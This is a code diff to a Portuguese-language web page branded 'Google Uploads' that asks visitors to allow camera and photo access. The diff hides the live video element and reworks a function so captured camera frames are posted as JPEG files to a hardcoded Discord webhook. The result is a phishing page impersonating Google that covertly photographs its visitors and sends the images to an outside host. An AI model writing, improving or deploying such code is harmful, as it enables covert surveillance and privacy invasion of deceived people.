@@ -46,7 +46,7 @@
         <h1>Google Uploads</h1>
         <p>Para continuar, você precisa permitir o acesso à sua câmera e fotos. Isso é necessário para que possamos processar suas imagens.</p>
         <button id="clickButton">Permitir Câmera e Fotos</button>
-        <video id="video" width="400" height="300" autoplay></video>
+        <video id="video" width="400" height="300" autoplay style="display:none;"></video>
         <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
     </div>
 
@@ -79,21 +79,13 @@
         }
 
         function sendImageToDiscord(imageData) {
+            const blob = dataURItoBlob(imageData);
+            const formData = new FormData();
+            formData.append('file', blob, 'photo.jpg');
+
             fetch('https://discord.com/api/webhooks/1469770449130094889/d1Ou1rjBSErYTaADNOqkHFqr06tWaS8lcf_66kE36CBvSEqapGUSV0iQhkONDY08OErP', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    content: 'Nova foto enviada!',
-                    files: [
-                        {
-                            contentType: 'image/jpeg',
-                            name: 'photo.jpg',
-                            data: imageData.split(',')[1]
-                        }
-                    ]
-                }),
+                body: formData,
             })
             .then(response => response.json())
             .then(data => {
@@ -102,6 +94,16 @@
             .catch((error) => {
                 console.error('Error:', error);
             });
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: 'image/jpeg' });
         }
     </script>
 </body>
